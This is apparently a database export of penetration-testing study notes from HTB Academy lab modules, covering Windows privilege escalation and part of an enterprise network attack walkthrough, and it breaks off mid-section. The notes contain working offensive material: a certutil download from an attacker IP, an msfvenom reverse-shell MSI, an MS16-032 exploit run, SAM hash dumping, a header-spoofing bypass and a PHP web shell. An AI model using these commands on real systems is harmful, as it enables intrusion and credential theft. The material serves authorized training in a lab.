The LOLBAS project documents Microsoft-signed binaries, scripts, and libraries that can be used for living off the land techniques. Certutil is a classic example whose intended use is handling certificates but can also be used to transfer files by downloading a file to disk or base64 encoding and decoding files:

```powershell
PS C:\htb> certutil.exe -urlcache -split -f http://10.10.14.3:8080/shell.bat shell.bat
```

```cmd
C:\htb> certutil -encode file1 encodedfile
C:\htb> certutil -decode encodedfile file2
```

---

## Always Install Elevated

If the AlwaysInstallElevated policy is enabled in both HKCU and HKLM any user can install MSI packages with SYSTEM privileges. Check both registry keys:

```powershell
PS C:\htb> reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer

    AlwaysInstallElevated    REG_DWORD    0x1

PS C:\htb> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer

    AlwaysInstallElevated    REG_DWORD    0x1
```

Both are 0x1 so it is vulnerable. Generate a malicious MSI and execute it silently:

```bash
$ msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.3 lport=9443 -f msi > aie.msi
```

```cmd
C:\htb> msiexec /i c:\users\htb-student\desktop\aie.msi /quiet /qn /norestart
```

```bash
$ nc -lnvp 9443

connect to [10.10.14.3] from (UNKNOWN) [10.129.43.33] 49720

C:\Windows\system32>whoami
nt authority\system
```

---

## Scheduled Tasks

Scheduled tasks may run as SYSTEM or admin users. Standard users cannot see tasks created by other users because they are stored in C:\Windows\System32\Tasks which standard users do not have read access to. However if a writable C:\Scripts directory is found where scheduled tasks execute scripts from we can append our payload to those scripts and escalate privileges when the task runs.

```cmd
C:\htb> schtasks /query /fo LIST /v

C:\htb> .\accesschk64.exe /accepteula -s -d C:\Scripts\

C:\Scripts
  RW BUILTIN\Users
  RW NT AUTHORITY\SYSTEM
  RW BUILTIN\Administrators
```

BUILTIN\Users has RW access to C:\Scripts. Append a reverse shell to one of the backup scripts and wait for the scheduled task to execute it.

---

## Mount VHDX/VMDK

Virtual hard drive files from backups can be mounted to extract credentials. If we find .vhd, .vhdx, or .vmdk files on file shares we can mount them and access the operating system files as if we were logged into them:

```bash
$ guestmount -a SQL01-disk1.vmdk -i --ro /mnt/vmdk
$ guestmount --add WEBSRV10.vhdx --ro /mnt/vhdx/ -m /dev/sda1
```

Navigate to Windows\System32\Config and extract SAM, SECURITY, and SYSTEM files:

```bash
$ secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL

[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
```

---

## Legacy Operating Systems

Legacy operating systems like Windows XP, Vista, 7, Server 2003, and Server 2008 are still found in many environments especially in healthcare, education, government, and manufacturing sectors. These systems no longer receive security updates leaving them vulnerable to known exploits that will never be patched. When Microsoft stops supporting a version of Windows they stop releasing security updates. Windows Server 2008 reached EOL on January 14, 2020, Windows 7 reached EOL on January 14, 2020. These systems often provide easy footholds due to their extensive known vulnerabilities. As penetration testers we must understand why clients cannot always upgrade these systems and provide contextual recommendations including solutions such as strict network segmentation.

---

## Windows Server 2008 Case Study

Server 2008 lacks many modern security features including Enhanced Windows Defender ATP, Credential Guard, Remote Credential Guard, Device Guard, and Control Flow Guard. We can use enumeration scripts like Sherlock to look for missing patches. Sherlock may identify multiple vulnerabilities including MS10-092 Task Scheduler XML, MS15-051 ClientCopyImage Win32k, and MS16-032 Secondary Logon Handle all as Appears Vulnerable. We get a Meterpreter shell using the smb_delivery module and use the MS10-092 exploit for privilege escalation to receive a SYSTEM Meterpreter session.

---

## Windows 7 Case Study

Windows 7 is missing critical security features present in Windows 10 including Credential Guard, Device Guard, Control Flow Guard, limited AppLocker, and partial Windows Defender. We use the Windows-Exploit-Suggester tool against systeminfo output to find applicable exploits. MS16-032 Secondary Logon Handle Privilege Escalation is commonly found on unpatched Windows 7 systems:

```powershell
PS C:\htb> Set-ExecutionPolicy bypass -scope process
PS C:\htb> Import-Module .\Invoke-MS16-032.ps1
PS C:\htb> Invoke-MS16-032

         __ __ ___ ___   ___     ___ ___ ___
        |  V  |  _|_  | |  _|___|   |_  |_  |
        |     |_  |_| |_| . |___| | |_  |  _|
        |_|_|_|___|_____|___|   |___|___|___|

                       [by b33f -> @FuzzySec]

[+] Duplicating CreateProcessWithLogonW handle
[*] Sniffing out privileged impersonation token..
[+] Thread suspended
[+] Building SYSTEM impersonation token
[+] Resuming thread..
[*] Sniffing out SYSTEM shell..
[!] Holy handle leak Batman, we have a SYSTEM shell!!
```

```cmd
C:\htb> whoami
nt authority\system
```

---

## Windows Hardening

Proper hardening can eliminate most if not all opportunities for local privilege escalation. Key hardening measures include secure clean OS installation using a custom image, regular updates and patching managed through WSUS, configuration management through Group Policy for centralized control, proper user management with strong password policies and two-factor authentication, periodic security audits using frameworks like DISA STIGs and Microsoft Security Compliance Toolkit, and comprehensive logging using Sysmon for detailed process and network monitoring.

Essential hardening steps include enabling secure boot and BitLocker disk encryption, auditing writable files and directories, using absolute paths in scheduled tasks and scripts, never storing credentials in cleartext in world-readable files, cleaning up home directories and PowerShell history, ensuring low-privileged users cannot modify custom libraries, removing unnecessary packages and services, utilizing Device Guard and Credential Guard features, and enforcing configuration changes through Group Policy. Always test hardening measures before deploying across the enterprise as what works for one organization may break critical functions in another.

---

> **End of Notes — Windows Privilege Escalation Module (HTB Academy)**', NULL, 'PUBLISHED', 'PUBLIC', 71, 'cmvcsa9i0000hidr0sh1y58oz', 'cmvcr40dj0000idhkp489xa3k', to_timestamp(1792440508.822), to_timestamp(1792440660.661), NULL, NULL)
ON CONFLICT ("slug") DO UPDATE SET "title" = EXCLUDED."title", "contentMarkdown" = EXCLUDED."contentMarkdown", "contentHtml" = EXCLUDED."contentHtml", "description" = EXCLUDED."description", "status" = EXCLUDED."status", "updatedAt" = EXCLUDED."updatedAt";
INSERT INTO "Document" ("id", "title", "slug", "description", "contentMarkdown", "contentHtml", "status", "visibility", "readingTimeMin", "categoryId", "authorId", "createdAt", "updatedAt", "publishedAt", "deletedAt")
VALUES ('cmvfoyod000dnida0olce06ab', 'Attacking Enterprise Networks ', 'attacking-enterprise-networks', 'Complete HTB Academy "Attacking Enterprise Networks" walkthrough: external recon → web exploitation → command-injection foothold → pivoting → AD lateral movement → DCSync (Domain Admin) → double-pivot → DirtyPipe root. Includes CTF documentation guide, findings table, and credentials cheat-sheet.', '# Attacking Enterprise Networks — Complete Notes

> Beginner-friendly, step-by-step notes based on the HTB Academy **Attacking Enterprise Networks** module. Every heading has a short plain-English explanation of *what* we are doing and *why*, followed by the exact commands and how to run them. Nothing from the module is skipped.
>
> **How to read these notes:** Each numbered part follows the real attack chain, in order — from scanning the outside of the network all the way to taking over the whole Active Directory domain. If you are doing this as a CTF or an exam, you can follow the numbers top to bottom like a walkthrough.

---

## Table of Contents

1. [Intro to Attacking Enterprise Networks](#1-intro-to-attacking-enterprise-networks)
2. [Scenario & Kickoff](#2-scenario--kickoff)
   - 2.1 [The Engagement Scope](#21-the-engagement-scope)
   - 2.2 [Project Kickoff (SoW & RoE)](#22-project-kickoff-sow--roe)
   - 2.3 [Start of Testing](#23-start-of-testing)
3. [External Information Gathering](#3-external-information-gathering)
   - 3.1 [Initial Nmap Scan (Top 1000 Ports)](#31-initial-nmap-scan-top-1000-ports)
   - 3.2 [Full Aggressive Nmap Scan](#32-full-aggressive-nmap-scan)
   - 3.3 [Cutting Through the Noise with grep](#33-cutting-through-the-noise-with-grep)
   - 3.4 [DNS Zone Transfer](#34-dns-zone-transfer)
   - 3.5 [Virtual Host (vHost) Fuzzing with ffuf](#35-virtual-host-vhost-fuzzing-with-ffuf)
   - 3.6 [Adding Hosts to /etc/hosts](#36-adding-hosts-to-etchosts)
4. [Service Enumeration & Exploitation](#4-service-enumeration--exploitation)
   - 4.1 [FTP (Port 21)](#41-ftp-port-21)
   - 4.2 [SSH (Port 22)](#42-ssh-port-22)
   - 4.3 [Email Services — SMTP User Enumeration (Port 25)](#43-email-services--smtp-user-enumeration-port-25)
   - 4.4 [POP3 / IMAP (Ports 110/143/993/995)](#44-pop3--imap-ports-110143993995)
   - 4.5 [Checking for an Open Mail Relay](#45-checking-for-an-open-mail-relay)
   - 4.6 [rpcbind (Port 111)](#46-rpcbind-port-111)
5. [Web Enumeration & Exploitation](#5-web-enumeration--exploitation)
   - 5.1 [Web Application Enumeration with EyeWitness](#51-web-application-enumeration-with-eyewitness)
   - 5.2 [blog — Drupal 9 Dead End](#52-blog--drupal-9-dead-end)
   - 5.3 [careers — IDOR Vulnerability](#53-careers--idor-vulnerability)
   - 5.4 [dev — HTTP Verb Tampering + Unrestricted File Upload](#54-dev--http-verb-tampering--unrestricted-file-upload)
   - 5.5 [ir — WordPress LFI + Credential Brute Force](#55-ir--wordpress-lfi--credential-brute-force)
   - 5.6 [status — SQL Injection](#56-status--sql-injection)
   - 5.7 [support — Blind XSS & Session Hijacking](#57-support--blind-xss--session-hijacking)
   - 5.8 [tracking — SSRF to Local File Read (PDF)](#58-tracking--ssrf-to-local-file-read-pdf)
   - 5.9 [vpn — Fortinet Portal](#59-vpn--fortinet-portal)
   - 5.10 [gitlab — Misconfigured Instance](#510-gitlab--misconfigured-instance)
   - 5.11 [shopdev2 — XML External Entity (XXE) Injection](#511-shopdev2--xml-external-entity-xxe-injection)
   - 5.12 [monitoring — Command Injection (Filter Bypass)](#512-monitoring--command-injection-filter-bypass)
6. [Initial Access](#6-initial-access)
   - 6.1 [Getting a Reverse Shell with Socat](#61-getting-a-reverse-shell-with-socat)
   - 6.2 [Upgrading to a Stable TTY](#62-upgrading-to-a-stable-tty)
   - 6.3 [Reading Audit Logs with aureport (adm group)](#63-reading-audit-logs-with-aureport-adm-group)
   - 6.4 [Switching Users with the Found Credentials](#64-switching-users-with-the-found-credentials)
7. [Post-Exploitation Persistence](#7-post-exploitation-persistence)
   - 7.1 [SSH Persistence with Found Credentials](#71-ssh-persistence-with-found-credentials)
   - 7.2 [Local Privilege Escalation Checks (id & sudo -l)](#72-local-privilege-escalation-checks-id--sudo--l)
   - 7.3 [Abusing sudo openssl (GTFOBins)](#73-abusing-sudo-openssl-gtfobins)
   - 7.4 [Establishing Root Persistence via SSH Key](#74-establishing-root-persistence-via-ssh-key)
8. [Internal Information Gathering](#8-internal-information-gathering)
   - 8.1 [Setting Up Pivoting — SSH Dynamic Port Forwarding](#81-setting-up-pivoting--ssh-dynamic-port-forwarding)
   - 8.2 [Setting Up Pivoting — Metasploit Autoroute](#82-setting-up-pivoting--metasploit-autoroute)
   - 8.3 [Host Discovery (Ping Sweep)](#83-host-discovery-ping-sweep)
   - 8.4 [Host Enumeration (Static Nmap)](#84-host-enumeration-static-nmap)
   - 8.5 [AD Quick Hits — SMB NULL Session](#85-ad-quick-hits--smb-null-session)
   - 8.6 [172.16.8.50 — Tomcat Brute Force](#86-1721685 0--tomcat-brute-force)
   - 8.7 [172.16.8.20 — DotNetNuke & NFS Pillaging](#87-172168 20--dotnetnuke--nfs-pillaging)
9. [Exploitation & Privilege Escalation](#9-exploitation--privilege-escalation)
   - 9.1 [Attacking DNN (SQL Console & xp_cmdshell)](#91-attacking-dnn-sql-console--xp_cmdshell)
   - 9.2 [Uploading an ASPX Web Shell](#92-uploading-an-aspx-web-shell)
   - 9.3 [Privilege Escalation with PrintSpoofer (SeImpersonate)](#93-privilege-escalation-with-printspoofer-seimpersonate)
   - 9.4 [Dumping SAM & LSA Secrets with secretsdump](#94-dumping-sam--lsa-secrets-with-secretsdump)
   - 9.5 [Alternate Method — Reverse Port Forwarding](#95-alternate-method--reverse-port-forwarding)
10. [Lateral Movement](#10-lateral-movement)
    - 10.1 [Running SharpHound & BloodHound](#101-running-sharphound--bloodhound)
    - 10.2 [ForceChangePassword with PowerView](#102-forcechangepassword-with-powerview)
    - 10.3 [Share Hunting with Snaffler & CrackMapExec](#103-share-hunting-with-snaffler--crackmapexec)
    - 10.4 [Kerberoasting](#104-kerberoasting)
    - 10.5 [Password Spraying](#105-password-spraying)
    - 10.6 [Misc Techniques (GPP, Descriptions)](#106-misc-techniques-gpp-descriptions)
    - 10.7 [WinRM Access + unattend.xml + Sysax PrivEsc](#107-winrm-access--unattendxml--sysax-privesc)
    - 10.8 [Post-Exploitation Pillaging with Mimikatz](#108-post-exploitation-pillaging-with-mimikatz)
11. [Active Directory Compromise](#11-active-directory-compromise)
    - 11.1 [Targeted Kerberoasting with GenericWrite](#111-targeted-kerberoasting-with-genericwrite)
    - 11.2 [Abusing GenericAll Over a Group](#112-abusing-genericall-over-a-group)
    - 11.3 [DCSync Attack with secretsdump](#113-dcsync-attack-with-secretsdump)
12. [Post-Exploitation (After Domain Admin)](#12-post-exploitation-after-domain-admin)
    - 12.1 [Domain Password Analysis (Cracking NTDS)](#121-domain-password-analysis-cracking-ntds)
    - 12.2 [Active Directory Security Audit (PingCastle)](#122-active-directory-security-audit-pingcastle)
    - 12.3 [Hunting for Sensitive Data/Hosts](#123-hunting-for-sensitive-datahosts)
    - 12.4 [The Double Pivot — Reaching MGMT01](#124-the-double-pivot--reaching-mgmt01)
    - 12.5 [DirtyPipe Privilege Escalation (CVE-2022-0847)](#125-dirtypipe-privilege-escalation-cve-2022-0847)
    - 12.6 [Data Exfiltration & Domain Trusts](#126-data-exfiltration--domain-trusts)
13. [Engagement Closeout](#13-engagement-closeout)
    - 13.1 [Attack Path Recap](#131-attack-path-recap)
    - 13.2 [Structuring Findings](#132-structuring-findings)
    - 13.3 [Post-Engagement Cleanup](#133-post-engagement-cleanup)
    - 13.4 [Client Communication & Project Closeout](#134-client-communication--project-closeout)
14. [Beyond This Module](#14-beyond-this-module)
15. [Appendix A — Writing Proper Documentation (for CTFs & Reports)](#15-appendix-a--writing-proper-documentation-for-ctfs--reports)
    - 15.1 [Why Documentation Matters](#151-why-documentation-matters)
    - 15.2 [Folder & Note Structure to Set Up First](#152-folder--note-structure-to-set-up-first)
    - 15.3 [PDF-Style Report Template (Copy/Paste)](#153-pdf-style-report-template-copypaste)
    - 15.4 [How to Write a Single Finding (Example)](#154-how-to-write-a-single-finding-example)
    - 15.5 [Turning Your Markdown Notes into a PDF](#155-turning-your-markdown-notes-into-a-pdf)
16. [Appendix B — Full Findings List (Running Table)](#16-appendix-b--full-findings-list-running-table)
17. [Appendix C — Credentials Harvested (Cheat Sheet)](#17-appendix-c--credentials-harvested-cheat-sheet)

---

# 1. Intro to Attacking Enterprise Networks

This module is the final "boss fight" of the Penetration Tester path. Instead of teaching one skill at a time, it drops us into a full simulated company network and makes us use **everything** at once — information gathering, web attacks, network attacks, privilege escalation, lateral movement, pivoting, and Active Directory attacks. The whole point is that a real attack is never neatly separated into topics; we constantly switch between phases, chase dead ends, and adapt on the fly. The module is built as a "ride-along" where an experienced tester walks you through each decision and thought process, so you learn *why* each step is taken and not just *what command* to type.

The engagement follows the standard penetration testing process stages, which are the mental checklist we return to on every job:

- **Pre-Engagement** — paperwork, scope, and permission to test.
- **Information Gathering** — finding out what the target has (hosts, ports, services, subdomains).
- **Vulnerability Assessment** — spotting weaknesses in what we found.
- **Exploitation** — actually breaking in through those weaknesses.
- **Post-Exploitation** — looting the compromised host for more access and data.
- **Lateral Movement** — jumping from one machine to another inside the network.
- **Proof of Concept** — proving the impact so the client understands the risk.
- **Post-Engagement** — reporting, cleanup, and closing out professionally.

> **Key mindset:** A successful pentester constantly cycles through a "Rolodex" of skills. You never know what you''ll face, every network is unique, but every network is approached using these same core stages. Documentation and reporting skills matter as much as the hacking itself — that is what makes you marketable. By the end of the path you will have attacked 200+ targets (Windows, Linux, Web, and Active Directory).

---

# 2. Scenario & Kickoff

## 2.1 The Engagement Scope

Our fictional client is **Inlanefreight**, and our company is **Acme Security, Ltd.**. They hired us for a **full-scope External Penetration Test** to check how strong their internet-facing perimeter is. They want us to find *as many vulnerabilities as possible* (so we are not trying to be stealthy/evasive), and they want to know what an anonymous attacker on the internet could achieve. Crucially, the Rules of Engagement say that **if we break into the internal network, we are allowed to go as far as full Active Directory domain compromise**. No credentials were handed to us — we start from zero, like a real outside attacker.

The in-scope targets we are allowed to attack:

| External Testing | Internal Testing |
|---|---|
| `10.129.x.x` (the external-facing target host) | `172.16.8.0/23` |
| `*.inlanefreight.local` (all subdomains) | `172.16.9.0/23` |
| `INLANEFREIGHT.LOCAL` (the AD domain) | |

**Out of scope** (things we are NOT allowed to do): phishing/social engineering, physical attacks, destructive actions or Denial of Service (DoS), and any changes to the environment without written consent. Automated scanning is allowed, but we must be careful not to cause outages. The client gave us the primary domain and internal ranges but *not* the exact subdomains or live hosts — discovering those is part of the job.

## 2.2 Project Kickoff (SoW & RoE)

Before touching anything, two documents must be signed. The **Scope of Work (SoW)** lists the testing specifics, methodology, timeline, meetings, and deliverables. The **Rules of Engagement (RoE)** — also called the **Authorization to Test** document — is the legal "get out of jail" paper that lists exactly what is in scope (URLs, IPs, CIDR ranges, credentials) and names at least two contacts on each side with phone and email. It also states the start/stop dates and the allowed testing window. Without these signed, you do not test — period.

For this job we were given **one week to test** plus **two days to write the draft report** (which we should be writing as we go, not at the end). The client authorized **24/7 testing** but asked that heavy vulnerability scans run **after 18:00 London time** to avoid disrupting business. All documents are signed and the scope is fully filled in, so we are cleared to begin.

## 2.3 Start of Testing

It is Monday morning. Our testing VM is ready, and we have set up a **skeleton note-taking and directory structure** before doing anything else — this is the habit that saves you later. A smart efficiency trick: while the initial slow scans run, fill in as much of the report template as you can, so you are never wasting idle time. We also send a **"start of testing" notification email** to all relevant personnel (client contacts + our team), stating our testing source IP (e.g., `10.10.14.15`) so the client knows which traffic is us. Then we click send and kick off external information gathering.

> **CTF takeaway:** Even in a lab/CTF, make the folders and a notes file *first*. Future-you (writing the report or stuck at 2 AM) will thank you.

---

# 3. External Information Gathering

## 3.1 Initial Nmap Scan (Top 1000 Ports)

The first thing we do is a **quick Nmap scan** to get a "lay of the land" — we just want to know which common ports are open so we know what services we are dealing with. We always save scan output to our project folder so nothing is lost. The `--open` flag shows only open ports (less noise), `-oA` saves the output in all three formats (normal, grepable, XML) under one base filename, and `-iL scope` reads the list of target IPs from a file called `scope`.

**Step-by-step:**
1. Put your target IP(s) in a file named `scope` (one per line).
2. Run the quick scan:

```shell
sudo nmap --open -oA inlanefreight_ept_tcp_1k -iL scope
```

In this engagement the scan found **11 open ports**: FTP (21), SSH (22), SMTP (25), DNS (53), HTTP (80), POP3 (110), rpcbind (111), IMAP (143), IMAPS (993), POP3S (995), and an HTTP proxy (8080). This tells us we are looking at a **web server that also runs mail, DNS, and FTP** — a big attack surface.

## 3.2 Full Aggressive Nmap Scan

While the quick scan gives a fast picture, we immediately launch a **deeper, slower scan in the background** to get full details: OS detection, service versions, and default script output. The `-p-` flag scans **all 65,535 TCP ports** (not just the top 1000), and `-A` turns on aggressive detection (OS + version + scripts + traceroute). This is more intrusive, so on a real target we stay mindful that scripts could occasionally cause issues.

```shell
sudo nmap --open -p- -A -oA inlanefreight_ept_tcp_all_svc -iL scope
```

Key findings from the aggressive scan:
- **FTP `vsftpd 3.0.3`** with **anonymous login allowed** — and there is a `flag.txt` sitting in it.
- **SSH `OpenSSH 8.2p1`** on Ubuntu (no known exploits at the time).
- **SMTP `Postfix`**, with `VRFY` and `STARTTLS` supported.
- **HTTP `Apache 2.4.41`** titled "Inlanefreight", plus a second web app on 8080 titled "Support Center".
- **DNS** running (port 53), which is a big hint we might try a zone transfer.

## 3.3 Cutting Through the Noise with grep

Nmap output can be huge and hard to read. This one-liner **extracts just the running services and counts them** from the `.gnmap` (grepable) file, so we have a clean summary to work from. It filters out comment/status lines, pulls out the service field, cleans up whitespace, grabs the version info, removes blanks, and then sorts and counts unique services.

```shell
egrep -v "^#|Status: Up" inlanefreight_ept_tcp_all_svc.gnmap | cut -d '' '' -f4- | tr '','' ''\n'' | \
sed -e ''s/^[ \t]*//'' | awk -F ''/'' ''{print $7}'' | grep -v "^$" | sort | uniq -c | sort -k 1 -nr
```

The result is a tidy list showing how many of each service are running (e.g., 2× Dovecot pop3d, 2× Apache, 1× vsftpd, 1× Postfix, 1× OpenSSH). This "cheat sheet" view helps you decide what to attack next without re-reading the whole scan.

## 3.4 DNS Zone Transfer

Because DNS (port 53) is open, we try a **DNS Zone Transfer** — a misconfiguration where a DNS server hands over its *entire* list of records to anyone who asks. If it works, we instantly learn all the subdomains without guessing. The `dig axfr` command requests the full zone (`axfr` = full zone transfer) for the domain against the target DNS server. We already know from the scope sheet that the primary domain is `INLANEFREIGHT.LOCAL`.

```shell
dig axfr inlanefreight.local @10.129.203.101
```

**It worked**, and we got **9 additional subdomains**: `blog`, `careers`, `dev`, `gitlab`, `ir`, `status`, `support`, `tracking`, and `vpn`. In a real job where zone transfer is blocked, you would instead use passive sources like **DNSDumpster.com** or active subdomain brute-forcing. Each new subdomain is a new potential way in, so this expands our scope significantly.

## 3.5 Virtual Host (vHost) Fuzzing with ffuf

A **virtual host (vHost)** is a website that only responds when you send the right `Host:` header — so it won''t show up in DNS and you have to guess the name. We use **ffuf** to brute-force vHost names to find any the zone transfer missed. First we need to know what a "not found" response looks like so we can filter it out.

**Step 1 — Find the size of an invalid response** by requesting a host that definitely doesn''t exist:

```shell
curl -s -I http://10.129.203.101 -H "HOST: defnotvalid.inlanefreight.local" | grep "Content-Length:"
```

This returns `Content-Length: 15157`. Any invalid vHost will return this same size, so we tell ffuf to **filter out** that size with `-fs 15157`.

**Step 2 — Fuzz the vHosts.** `-w` is the wordlist (the module uses `/opt/useful/seclists/Discovery/DNS/namelist.txt`), `FUZZ` is where each word gets injected, `-u` is the URL, `-H ''Host:FUZZ...''` injects the guess into the Host header:

```shell
ffuf -w namelist.txt:FUZZ -u http://10.129.203.101/ -H ''Host:FUZZ.inlanefreight.local'' -fs 15157
```

This confirmed the known subdomains **and revealed one new vHost** that the zone transfer did not show: `monitoring.inlanefreight.local`. That hidden host turns out to be the key to getting inside later.

## 3.6 Adding Hosts to /etc/hosts

To visit these subdomains by name (instead of IP), our machine needs to know which IP each name points to. We add them all to `/etc/hosts` in one go. `sudo tee -a` appends text to the file (needs root), and the `<<EOT ... EOT` block lets us paste multiple lines at once.

```shell
sudo tee -a /etc/hosts > /dev/null <<EOT

## inlanefreight hosts
10.129.203.101 inlanefreight.local blog.inlanefreight.local careers.inlanefreight.local dev.inlanefreight.local gitlab.inlanefreight.local ir.inlanefreight.local status.inlanefreight.local support.inlanefreight.local tracking.inlanefreight.local vpn.inlanefreight.local
EOT
```

Now typing `http://blog.inlanefreight.local` in the browser will correctly reach the target. Remember to also add `monitoring` and any later-discovered vHosts (like `shopdev2`) as you find them.

---

# 4. Service Enumeration & Exploitation

## 4.1 FTP (Port 21)

**FTP** is a file transfer service. The scan already told us **anonymous login** is allowed, so we confirm it manually by logging in with the username `anonymous` and a blank password. The goal is to see if we can read sensitive files or upload a malicious one (which could become a web shell if the FTP folder is served by the web server).

```shell
ftp 10.129.203.101
# Name: anonymous
# Password: (just press Enter)
ftp> ls
ftp> put test.txt      # try to upload a file
```

Result: we can log in and see one `flag.txt`, but we **cannot change directories** and **cannot upload** (`550 Permission denied`). Public exploits for `vsftpd 3.0.3` are only a Denial of Service (out of scope), and brute forcing is pointless without usernames. **This is a dead end** — but note it and move on.

## 4.2 SSH (Port 22)

**SSH** is remote shell access. We start with a **banner grab** using netcat to confirm the exact version, because old versions sometimes have known bugs. `nc -nv` connects without DNS resolution (`-n`) and verbosely (`-v`).

```shell
nc -nv 10.129.203.101 22
# SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5
```

`OpenSSH 8.2` has **no known vulnerabilities**. We try a handful of weak guesses (`admin:admin`, `root:toor`, etc.) but all fail, and brute forcing without a username list is a shot in the dark that risks lockouts. **SSH is a dead end too.**

```shell
ssh admin@10.129.203.101   # Permission denied
```

## 4.3 Email Services — SMTP User Enumeration (Port 25)

**SMTP** (mail sending) can leak valid system usernames through the `VRFY` command, which checks if a mailbox exists. A valid user returns code `252`; an invalid one returns `550`. This list of real usernames could later feed a password-spraying attack against SSH, FTP, or a VPN.

**Step 1 — Rescan port 25 for misconfigurations** (`-sV` = version, `-sC` = default scripts):

```shell
sudo nmap -sV -sC -p25 10.129.203.101
```

**Step 2 — Connect via telnet and test VRFY:**

```shell
telnet 10.129.203.101 25
VRFY root          # 252 2.0.0 root       (valid)
VRFY www-data      # 252 2.0.0 www-data   (valid)
VRFY randomuser    # 550 ... User unknown (invalid)
```

`VRFY` is enabled, so we can enumerate users. This is a **Low-risk finding** worth reporting (reduce external attack surface by disabling `VRFY`). A tool like `smtp-user-enum` could automate this, and `EXPN`/`RCPT TO` could be tried too, but we don''t spend long brute forcing externally-facing auth as it can cause disruption.

## 4.4 POP3 / IMAP (Ports 110/143/993/995)

**POP3** (mail retrieval) can sometimes also enumerate users with the `USER` command — if the server replies `+OK`, the user exists. We test this on port 110. We connect with telnet and try a username.

```shell
telnet 10.129.203.101 110
user www-data
# -ERR [AUTH] Plaintext authentication disallowed on non-secure (SSL/TLS) connections.
```

Here it **does not work** — plaintext auth is disabled on the non-secure port, and probing the SSL port 995 yields nothing either. Another dead end, but we learned the mail stack is reasonably configured. (In a real job, if the client used Office 365 or Exchange, this would be a candidate for password spraying against mailboxes.)

## 4.5 Checking for an Open Mail Relay

An **open relay** is a mail server that will send email for *anyone*, which attackers abuse for phishing/spoofing. Even though phishing is out of scope, finding an open relay is worth reporting. We check with an Nmap script. `-Pn` skips host discovery (assume it''s up), and `--script smtp-open-relay` runs the relay test.

```shell
nmap -p25 -Pn --script smtp-open-relay 10.129.203.101
# |_smtp-open-relay: Server doesn''t seem to be an open relay, all tests failed
```

Result: **not an open relay** — good for the client. We note it as a positive and move on.

## 4.6 rpcbind (Port 111)

**rpcbind** maps RPC services to ports and generally **should not be exposed to the internet**. It rarely gives direct access but can leak OS/service info, so it''s a **Low-risk "Unnecessary Exposed Service" finding**. We query it with `rpcinfo`.

```shell
rpcinfo 10.129.203.101
```

It responds but gives nothing useful beyond confirming it''s exposed. We note it down for the client''s awareness. At this point the only remaining service is **HTTP (port 80 / 8080)** — and since the subdomain enumeration showed many web apps, web is where we''ll spend most of our time. In modern networks, the web layer is almost always the biggest and softest attack surface.

> **Reportable findings so far:** SMTP `VRFY` user enumeration (Low), rpcbind exposed externally (Low). Everything else (FTP, SSH, POP3, relay) was a dead end.

---

# 5. Web Enumeration & Exploitation

Web applications are where we spend most of our time on an External Penetration Test, because they present a huge attack surface and can suffer from many vulnerability classes (RCE, data exposure, etc.). One important distinction: a **Web Application Security Assessment (WASA)** reports *every* little issue (missing cookie flags, version headers), while an **External Penetration Test** only chases **high-risk** issues (SQLi, file upload, XSS, XXE, LFI, command injection) because we have a lot of ground to cover. A good trick is to add one catch-all "Best Practice/Informational" finding listing the minor HTTP header issues, so we''re covered if the client asks why we didn''t report X.

## 5.1 Web Application Enumeration with EyeWitness

With 11+ web apps to look at, browsing each one by hand is slow. **EyeWitness** visits each site and takes a **screenshot**, so we can eyeball them all at once and prioritize the interesting ones. The `-f` flag feeds it a text file of subdomains; `-d` sets the output directory. (It can also take an Nmap `.xml` or Nessus file, which is handy on big internal scopes.)

```shell
cat ilfreight_subdomains     # our list including monitoring.inlanefreight.local
eyewitness -f ilfreight_subdomains -d ILFREIGHT_subdomain_EyeWitness
```

> **Lesson:** Automation is great, but *understand what your tools do* and spot-check them. If your automation silently misses half the targets, it''s doing more harm than good. We now work through each interesting host one by one.

## 5.2 blog — Drupal 9 Dead End

The `blog` subdomain is a **Drupal** site that looks like a forgotten/un-hardened install. We confirm the version with cURL by grepping the page source for the "Generator" meta tag. Knowing the exact CMS version tells us which public exploits might apply.

```shell
curl -s http://blog.inlanefreight.local | grep Drupal
# <meta name="Generator" content="Drupal 9 ..." />
```

It''s **Drupal 9**. The famous **Drupalgeddon 1-3** exploits only affect older versions, so those are out. Weak admin passwords (`admin:admin`, `admin:Welcome1`) and user registration both fail. **Dead end** — but we note that an unused Drupal instance should be taken down to reduce attack surface.

## 5.3 careers — IDOR Vulnerability

The `careers` job-board site lets us **register an account** — always test registration, as it often leads to issues. We register with *bogus but strong* credentials (e.g., `pentester:Str0ngP@ssw0rd!`) so we don''t accidentally leave a weak account behind. (Tip: use a disposable email like 10 Minute Mail so Burp''s scanner doesn''t flood your real inbox.) After logging in, our profile URL is `/profile?id=9`.

```text
http://careers.inlanefreight.local/profile?id=9
# change id=9 to id=8, id=7 ... and you see OTHER users'' profiles
```

Changing the `id` number lets us view **other users'' profiles and their job applications**. That is a classic **Insecure Direct Object Reference (IDOR)** — the app trusts the ID in the URL without checking we''re allowed to see it. The file-upload (CV) feature accepts any file type but we can''t find where uploads land, so that path is dead. We record **IDOR** as a reportable finding (sensitive data exposure) and move on.

## 5.4 dev — HTTP Verb Tampering + Unrestricted File Upload

The `dev` site ("Key Vault" login) resists weak passwords, so we **directory brute-force** with Gobuster. `dir` is directory mode, `-w` is the wordlist, `-x .php` also tries a `.php` extension on each word, `-t 300` uses 300 threads (fast).

```shell
gobuster dir -u http://dev.inlanefreight.local -w /usr/share/wordlists/dirb/common.txt -x .php -t 300
```

We find `/uploads` (directory listing enabled — a low finding) and `/upload.php`, which returns a confusing **403 Forbidden with a 200 status**. Using **Burp Repeater**, we send an `OPTIONS` request and see allowed methods: `GET, POST, PUT, TRACK, OPTIONS`. The **`TRACK`** method reveals a header `X-Custom-IP-Authorization: 172.18.0.1` — the app only shows the upload form to a trusted IP. This is **HTTP Verb Tampering**: we bypass the restriction by **spoofing that header** to localhost.

```http
TRACK /upload.php HTTP/1.1
Host: dev.inlanefreight.local
X-Custom-IP-Authorization: 127.0.0.1
```

Now an upload form ("Pixel Shop") appears. We try to upload a PHP web shell:

```php
<?php system($_GET[''cmd'']); ?>
```

